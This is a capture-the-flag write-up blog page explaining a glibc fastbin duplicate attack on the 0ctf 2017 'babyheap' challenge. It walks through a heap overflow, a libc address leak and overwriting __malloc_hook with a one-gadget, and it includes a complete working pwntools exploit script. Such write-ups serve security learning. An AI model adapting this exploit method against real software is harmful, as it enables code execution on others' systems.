<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Fastbin attack</title>
	
	<meta name="author" content="Quentin Meffre">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">
	<link href="/assets/css/syntax.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/meffre-q">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/0xdagger">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
				quentin meffre
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs" style="">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="/assets/media/myavatar-1-.png" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="/">quentin meffre</a>
    </h3>
</header>


<div id="bio" class="text-center">
	Computer science student, passionate about Cyber Security.
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/meffre-q">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/0xdagger">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/quentin-meffre">
				<i class="fa fa-linkedin fa-lg"></i>
			</a>
		</li>
		
		<li>
			<a class="btn btn-default btn-sm" href="/feed.xml">
				<i class="fa fa-rss fa-lg"></i>
			</a>
		</li>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Fastbin attack </h1>
</div>
	
<article>

	<div class="col-sm-10">
	 <span class="post-date">
	   
	   November 
	   2nd,
	     
	   2018
	 </span>
	  <div class="article_body">
	  <p>Explanation of an heap exploit method, the fastbin duplicate attack. This post is based on the babyheap challenge from the 0ctf Quals 2017.</p>

<h1 id="surroundings">Surroundings</h1>
<p>Currently I learn the heap exploit using the <a href="https://github.com/shellphish/how2heap">How2Heap</a> repository. Today I’m gonna tell you my interpretation of the fastbin attack using the <a href="https://github.com/ctfs/write-ups-2017/tree/master/0ctf-quals-2017/pwn/Baby-Heap-2017-255">babyheap</a> challenge from the 0ctf quals 2017.</p>

<h1 id="introduction">Introduction</h1>
<p>This challenge is provided with a binary and its LibC.</p>

<p>Let first begun by recovering some informations of our binary:</p>

<p><img src="/assets/media/fastbin_get_info.png" alt="Check_binary" /></p>

<p>From these commands output, we have the following informations:</p>
<ul>
  <li>The binary is an ELF, compiled for x86_64 architecture ;</li>
  <li>It is dynamically linked ;</li>
  <li>It is stripped ;</li>
</ul>

<p>The following protections are enabled:</p>
<ul>
  <li>Full REad onLy RelOcation (We can’t overwrite the GOT entry’s) ;</li>
  <li>Stack smash protection (We must take care about the stack canary’s) ;</li>
  <li>The stack is executable (We can’t execute a shellcode on this memory segment) ;</li>
  <li>Position Independant Executable is enable (We must leak address’s if we want to use ROP) ;</li>
</ul>

<p>Let’s try to execute it now:</p>

<p><img src="/assets/media/fastbin_run_binary.png" alt="First try" /></p>

<p>It seems to be classic heap challenge. We can manage the heap using different command. The following commands are available:</p>
<ul>
  <li>Allocate, which allocate a chunk (using calloc()) on the heap using a given size (less than 0x1000) and setup a struct with the given size and the allocated chunk, but the struct is not on the heap ;</li>
  <li>Fill, which fill a chunk at a given index using both a given size and content ;</li>
  <li>Free, which free a chunk at a given index, zeroed the chunk pointer and setup the chunk’s struct to unused ;</li>
  <li>Dump, which dump the content of a chunk at a given index ;</li>
  <li>Exit, which exit the process ;</li>
</ul>

<h1 id="vulnerability">Vulnerability</h1>
<p>The vulnerability is located in the <code class="highlighter-rouge">Fill</code> command:</p>

<p><img src="/assets/media/fastbin_allocate_vuln.png" alt="Vulnerability" /></p>

<p>As you can see on the above image, the <code class="highlighter-rouge">fill</code> command ask for a size which is used to read a string of the given size using the <code class="highlighter-rouge">read_str</code> function in the given chunk. There is no boundary check, this allow an attacker to overflow the data located on the heap.</p>

<p>To exploit this heap overflow, I used the <code class="highlighter-rouge">fastbin attack</code> method.</p>

<p>The exploit plan is the following one:</p>
<ul>
  <li>Leak the LibC using fastbins and smallbin ;</li>
  <li>Tricking malloc() into returning the address of <code class="highlighter-rouge">__malloc_hook</code> ;</li>
  <li>Overwrite <code class="highlighter-rouge">__malloc_hook</code> with the address of a one gadget ;</li>
  <li>Trigger the hook using malloc()!</li>
</ul>

<h1 id="fastbin-attack">Fastbin attack</h1>
<p>The fastbin’s array is located in the <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state">malloc_state</a> structure. This array has a size of ten and each fastbin hold bins of the same size. (0x20, 0x30, 0x40, etc.) If you want more info about how fastbins work, check <a href="https://heap-exploitation.dhavalkapil.com/">here</a>.</p>

<p>The goal of this attack is to overwrite the data of a fastbin to trick malloc() into returning a nearly-arbitrary pointer.</p>

<p>ptmalloc2, the GlibC allocator got many update seens it was implemented. Today it is a little bit harder to exploit this technique due to the security check that have been added to malloc/free. To exploit our binary, we need to bypass the following check in malloc():</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="n">victim_idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">victim_idx</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
  <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): memory corruption (fast)"</span><span class="p">);</span>
<span class="n">check_remalloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
</code></pre></div></div>

<p>In case malloc() found a fastbin which has the same size as the requested one, it gonna check if the size of the returned chunk is in the same <code class="highlighter-rouge">index</code> than the size given to malloc(). If both <code class="highlighter-rouge">index</code> are not equal, malloc will exit and print an error.</p>

<p>But if both size are in the same index, malloc() will return our arbitrary pointer!</p>

<h1 id="leak-libc">Leak LibC</h1>
<p>The leak has been the hardest part for me. It took me a while to found a method to leak the LibC because of the followings:</p>
<ul>
  <li>There are no dangling point, every pointer are zeroed when there are free ;</li>
  <li>When a chunk is allocated, the function used is calloc() so no Use After Free ;</li>
  <li>When we free a pointer, there is a check to know if the pointer is in use or not, so no double free ;</li>
</ul>

<p>To start, I allocate several chunks. Below is a picture visualizing heap layout:</p>

<p><img src="/assets/media/fastbin_init_state.png" alt="heap_layout" /></p>

<p>The heap is compose of 4 fastbins which have a size of 0x20 with there header and 2 smallbins which have a size of 0x90 with the header. The fifth first bins are used to leak the LibC and the last smallbin is used to force free() to put the fifth chunk into the unsortedbin and so populated the forward pointer when we will free it. If this chunk is not present, free() will consolidate the freed chunk into the top chunk, as you can see below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="p">{</span>
  <span class="n">size</span> <span class="o">+=</span> <span class="n">nextsize</span><span class="p">;</span>
  <span class="n">set_head</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
  <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
  <span class="n">check_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This cause free() not to populated the forward pointer.</p>

<p>The leak technique is in 6 parts:</p>
<ul>
  <li>We first <code class="highlighter-rouge">free</code>, respectively, the third and second chunk to populate the forward pointer of the second chunk ;</li>
  <li>Then we use the heap overflow on the first chunk to overwrite the <code class="highlighter-rouge">Less Significant Byte</code> of the forward pointer of the <code class="highlighter-rouge">second chunk</code> with the value <code class="highlighter-rouge">0x80</code>, which is the LSB of the first smallbin. The idea here is to trick malloc into returning the smallbin chunk. Using this we will have two pointers which point to the same address ;</li>
  <li>If we try to malloc now, malloc will thrown an error because of the chunk size condition we saw just before. So we need to edit the size of the first smallbin in order to trick malloc. To do this, we will use another time our heap overflow on the fourth allocated chunk to edit the <code class="highlighter-rouge">mchunk_size</code> header field of the first smallbin chunk with the value <code class="highlighter-rouge">0x21</code>.</li>
</ul>

<p>After these steps, the heap layout look like below:</p>

<p><img src="/assets/media/fastbin_corrupted_size.png" alt="fastbin_corrupted_size" /></p>

<p>As you can see, the Less Significant Byte of the forward pointer of the second chunk has been overflowed by the one of the first smallbin. The size of the first smallbin has also been overflowed by the correct size of our fastbin, 0x20. The next step are the following:</p>
<ul>
  <li>We gonna alocate two chunks of size 0x20. The first one will have the address of the first freed chunk and the second one will have the address of the first smallbin because of our previous trick. Thanks to this, we have two chunks which both point to the <code class="highlighter-rouge">same address</code> which is the first smallbin chunk.</li>
  <li>Before beeing able to leak our LibC, we must set again the size of the first <code class="highlighter-rouge">smallbin</code>, otherwise we will have an error when we gonna free it. (Because we need to free it to populate the forward/backward pointer) So we will use one more time our heap overflow to set the first smallbin size to its initialize size which was 0x90.</li>
  <li>Now its pretty easy to leak the LibC, we just have to free the first smallbin, this will populated the forward/backward pointer of this bins with one of the addresses of the LibC. Then we can dump the content of the second pointer which also point to the freed area but as this one is up, we can use it.</li>
</ul>

<h1 id="exploitation">Exploitation</h1>
<p>Now that we defeat the ASLR, we just have to trick malloc into returning the <code class="highlighter-rouge">__malloc_hook</code> address’s then overwrite it with our <code class="highlighter-rouge">one_gadget</code> address’s.</p>

<p>This exploit gonna be done in 6 steps:</p>
<ul>
  <li>First we will allocate 4 fastbins which have a size of <code class="highlighter-rouge">0x70</code>. The size is very important, you will see why.</li>
  <li>Then we are going to free the last one and the one before it in that order.</li>
  <li>Now we will overflow the forward pointer of the second freed chunk using the allocated one before it with the address of the memory area we want malloc() to return. But we can’t simply put the address’s of the <code class="highlighter-rouge">__malloc_hook</code> because of the following:</li>
</ul>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/4gx 0x7ffff7dd3af0-16
0x7ffff7dd3ae0 &lt;__memalign_hook&gt;:	0x00007ffff7ab6420	0x00007ffff7ab63c0
0x7ffff7dd3af0 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
</code></pre></div></div>

<p>The size <code class="highlighter-rouge">0x00007ffff7ab63c0</code> is not correct so, because of the size condition we saw before, malloc will raise an error as this size is not in the following range:
<code class="highlighter-rouge">0x70 &lt; size &lt; 0x7f</code></p>

<p>But, above <code class="highlighter-rouge">__malloc_hook</code> there are these datas into the memory:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/8gx 0x7ffff7dd3af0-35
0x7ffff7dd3acd &lt;_IO_wide_data_0+301&gt;:	0xfff7dcff00000000	0x000000000000007f
0x7ffff7dd3add:	0xfff7ab6420000000	0xfff7ab63c000007f
0x7ffff7dd3aed &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000
0x7ffff7dd3afd:	0x0100000000000000	0x0000000000000000
</code></pre></div></div>

<p>As the size 0x7f is in the above range, we can use the offset of the address <code class="highlighter-rouge">0x7ffff7dd3acd</code>. We will just have to take care of the padding between both addresses to being sure that we overwrited the good address’s.</p>

<ul>
  <li>Then we have to allocate two chunks in order to tricking malloc into returning our arbitrary pointer. The arbitrary pointer will the one returned by the second malloc().</li>
  <li>Then we fill the returned arbitrary pointer with the address’s of our one gadget.</li>
  <li>To finish we will allocate a chunk, this will call malloc but because of the below code from malloc():</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
  <span class="o">=</span> <span class="n">atomic_forced_read</span> <span class="p">(</span><span class="n">__malloc_hook</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">hook</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
  <span class="k">return</span> <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)(</span><span class="n">bytes</span><span class="p">,</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">));</span>
</code></pre></div></div>

<p>As <code class="highlighter-rouge">__malloc_hook</code> is not NULL, malloc() will call our one gadget.</p>

<p>Here is my exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span>


<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>
<span class="c1">#context.log_level="DEBUG"
</span>

<span class="k">class</span> <span class="nc">Pwn</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./babyheap"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc-2.24.so"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">start_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./babyheap"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">allocate_cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">fill_cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">free_cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">dump_cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">leak_libc</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">free_cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">free_cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fill_cmd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fill_cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fill_cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">free_cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">data</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">dump_cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="mi">10</span><span class="p">:]</span>
        <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">rewrite_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">dest</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">free_cmd</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">free_cmd</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fill_cmd</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">allocate_cmd</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fill_cmd</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">19</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">dest</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1337</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">pwn_binary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">start_binary</span><span class="p">()</span>

        <span class="n">base_libc</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">leak_libc</span><span class="p">()</span><span class="o">-</span><span class="mh">0x399b58</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak libc base address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_libc</span><span class="p">))</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">rewrite_addr</span><span class="p">(</span><span class="n">base_libc</span><span class="o">+</span><span class="mh">0x399acd</span><span class="p">,</span> <span class="n">base_libc</span><span class="o">+</span><span class="mh">0x3f35a</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">pwn</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">pwn_binary</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<h1 id="demo">Demo</h1>
<p>Let’s test it:</p>

<p><img src="/assets/media/fastbin_test.png" alt="fastbin_demo" /></p>

<p>Done.</p>

<h1 id="references">References</h1>
<ul>
  <li>https://sploitfun.wordpress.com/</li>
  <li>https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</li>
  <li>https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/</li>
</ul>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#exploit-ref">
					exploit <span>(1)</span>
					,
				</a></li>
			 
				<li><a href="/categories.html#heap-ref">
					heap <span>(1)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#pwn-ref">
					pwn <span>(11)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Fastbin attack&via=0xdagger"
